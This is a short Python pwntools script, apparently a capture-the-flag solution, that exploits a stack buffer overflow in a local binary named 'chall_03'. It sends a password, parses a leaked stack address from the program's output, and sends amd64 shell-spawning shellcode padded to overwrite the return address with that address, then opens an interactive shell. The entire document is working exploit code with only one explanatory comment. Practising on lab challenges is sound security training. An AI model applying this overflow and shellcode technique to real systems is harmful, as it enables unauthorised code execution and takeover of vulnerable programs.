from pwn import *

context.arch = "amd64" #we do this because we have issues without it if we have 64 bit calling convention

p = process ("./chall_03")
p.recv()
p.sendline("andyrulz")
resp = p.recv()
resp
import re
re.findall(b"([a-f0-9]{8,16})",resp)[0]
shellcodeAddr = p64(int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16))
shellcode = asm(shellcraft.amd64.sh())
payload = b''
payload += shellcode + b'A' * (0x70 + 8 - len(shellcode)) + shellcodeAddr
p.sendline(payload)
p.interactive()
ls
